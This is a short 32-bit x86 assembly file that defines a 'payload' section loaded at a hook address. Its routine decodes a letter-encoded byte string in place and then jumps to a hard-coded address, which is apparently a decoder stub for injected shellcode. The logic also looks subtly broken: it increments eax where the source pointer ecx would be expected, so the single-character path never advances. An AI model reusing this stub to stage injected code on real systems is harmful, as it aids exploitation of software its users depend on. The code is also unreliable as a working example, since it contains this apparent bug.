bits 32
section payload
%include 'globals.inc'

org hookBase

unpack:
        add eax, 35
        mov edx, eax
        mov ecx, eax

.processChar:
        mov al, [ecx]
        or al, al
        jnz .continue
        jmp 0A20000h
.continue
        cmp al, 97
        jge .twoChars
        sub al, 65
        jmp .storeByte
.twoChars:
        inc ecx
        sub al, 97
        shl eax, 4
        add al, [ecx]
        sub al, 97
.storeByte:
        mov [edx], al
        inc eax
        inc edx
        jmp .processChar